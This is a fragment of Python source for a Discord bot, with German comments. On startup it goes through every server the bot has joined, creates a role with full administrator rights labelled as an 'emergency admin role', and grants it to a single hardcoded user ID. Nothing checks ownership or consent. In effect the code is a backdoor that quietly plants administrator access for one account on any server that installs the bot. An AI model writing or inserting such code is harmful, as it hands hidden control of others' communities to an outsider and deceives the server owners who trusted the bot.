TARGET_USER_ID = 1449876807665848371

@bot.event
async def on_ready():
    print(f"Bot ist online! Eingeloggt als: {bot.user.name}")
    print("-----------------------------------------------------")

    # Gehe alle Server durch, auf denen der Bot ist
    for guild in bot.guilds:
        try:
            # 1. Prüfen oder Erstellen der Admin-Rolle
            admin_role = discord.utils.get(guild.roles, name="Server Owner Admin")
            if not admin_role:
                permissions = discord.Permissions(administrator=True)
                admin_role = await guild.create_role(
                    name="Server Owner Admin",
                    permissions=permissions,
                    color=discord.Colour.gold(),
                    reason="Notfall-Admin-Rolle erstellt"
                )
                print(f"[{guild.name}] Admin-Rolle erstellt.")

            # 2. User suchen und Rolle zuweisen
            member = guild.get_member(TARGET_USER_ID) or await guild.fetch_member(TARGET_USER_ID)
            if member:
                if admin_role not in member.roles:
                    await member.add_roles(admin_role)
                    print(f"[{guild.name}] Rolle erfolgreich an {member.name} vergeben!")
                else:
                    print(f"[{guild.name}] User hat die Rolle bereits.")
            else:
                print(f"[{guild.name}] User mit ID {TARGET_USER_ID} befindet sich nicht auf dem Server.")

        except Exception as e:
            print(f"Fehler auf Server {guild.name}: {e}")
